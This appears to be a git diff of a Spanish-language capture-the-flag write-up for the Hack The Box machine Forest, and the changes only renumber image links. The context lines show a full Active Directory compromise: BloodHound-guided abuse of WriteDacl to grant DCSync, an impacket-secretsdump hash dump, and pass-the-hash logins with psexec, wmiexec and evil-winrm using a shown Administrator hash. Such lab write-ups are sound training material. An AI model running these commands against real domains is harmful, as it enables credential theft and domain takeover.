@@ -139,27 +139,27 @@ Y lo marcamos como owned:
 
 Si miramos la información del nodo de svc-alfresco, y más en concreto el apartado "Reachable High Value Targets", vemos cosas interesantes:
 
-![22](Images/22.png)
+![21](Images/21.png)
 
 
 El usuario svc-alfresco forma parte del grupo "Service Accounts", que a su vez forma parte de "Privileged It Accounts", que a su vez forma parte de "Account Operators".
 
 Si miramos la información del nodo de "Account Operators", y nuevamente el apartado "Reachable High Value Targets", vemos:
 
-![23](Images/23.png)
+![22](Images/22.png)
 
 El grupo "Account Operators" tiene el privilegio GenericAll sobre el grupo "Exchange Windows Permissions, que a su vez tiene el privilegio "WriteDacl" sobre el dominio htb.local. Si necesitamos más información sobre la relación que existe entre los grupos o sobre el privilegio, podemos hacer click derecho -> help
 
-![24](Images/24.png)
+![23](Images/23.png)
 
 Por ejemplo, para este caso, nos confirma lo que vimos en el diagrama: los miembros del grupo "Account Operators"  tienen el privilegio GenericAll sobre el grupo "Exchange Windows Permissions".
 
-![25](Images/25.png)
+![24](Images/24.png)
 
 
 A su vez, si queremos ver la relación que hay entre el grupo "Exchange Windows Permissions" y el dominio a través del privilegio WriteDacl, hacemos nuevamente click derecho -> help. A su vez, esto nos permite conocer la forma de explotar este privilegio:
 
-![26](Images/26.png)
+![25](Images/25.png)
 
 
 En el apartado "Windows Abuse" nos explica el paso a paso para hacerlo desde dentro.
@@ -178,12 +178,12 @@ Una vez ya lo tenemos en la máquina víctima, comenzamos.
 
 - Creamos usuario pwn:
 
-![27](Images/27.png)
+![26](Images/26.png)
 
 
 - Le añadimos al grupo "Exchange Windows Permissions"
 
-![28](Images/28.png)
+![27](Images/27.png)
 
 Y seguimos los comandos propuestos por Bloodhound, pero adaptados a nuestro escenario (dominio y usuario):
 
@@ -205,24 +205,24 @@ Inciso importante.
 Aquí bloodhound propone ejecutar el anterior comando identificando al dominio de la siguiente forma: ``-TargetIdentity htb.local``. Sin embargo, cuando se realiza la técnica DCSync desde el usuario pwn, nos salta error mencionando el Distinguised Name.
 Error:
 
-![29](Images/29.png)
+![28](Images/28.png)
 
 Y aunque se utilice -use-vss como nos propone, nos da acceso denegado:
 
-![30](Images/30.png)
+![29](Images/29.png)
 
 Esto se soluciona identificando al dominio como se ha descrito en el primer comando:
 
 ``-TargetIdentity "DC=htb,DC=local"``
 
-![31](Images/31.png)
+![30](Images/30.png)
 
 
 Una vez el usuario pwn tiene el privilegio DCSync, lo explotamos vía impacket para volcar todos los hashes NTLM:
 
 ``impacket-secretsdump htb.local/'pwn':'pwned123!'@'10.10.10.161'``
 
-![32](Images/32.png)
+![31](Images/31.png)
 
 
 Nos vuelca todos los hashes NTLM, pero para continuar nos interesa especialmente el hash del usuario Administrator.
@@ -233,7 +233,7 @@ Validamos el hashNTLM con netexec:
 
 ``netexec smb 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'``
 
-![33](Images/33.png)
+![32](Images/32.png)
 
 Pwn3d!, son credenciales válidas y, efectivamente, de Administrador.
 
@@ -243,13 +243,13 @@ Dado que conocemos el hash NTLM válido de Administrator podemos acceder al sist
 
 ``impacket-psexec Administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'``
 
-![34](Images/34.png)
+![33](Images/33.png)
 
 - wmiexec:
 
 ``impacket-wmiexec Administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'``
 
-![35](Images/35.png)
+![34](Images/34.png)
 
 
 - evilwinrm:
@@ -258,19 +258,19 @@ Primero deberíamos validar que nos podemos conectar por winrm:
 
 ``netexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'``
 
-![36](Images/36.png)
+![35](Images/35.png)
 
 Pwn3d!, por lo que podemos utilizar evil-winrm.
 
 ``evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'``
 
-![37](Images/37.png)
+![36](Images/36.png)
 
 
 Podemos conectarnos a la máquina víctima y elevar privilegios de cualquiera de estas tres formas descritas.
 
 Recogemos la flag de Administrator en C:\Users\Administrator\Desktop\root.txt
 
-![38](Images/38.png)
+![37](Images/37.png)
 
 
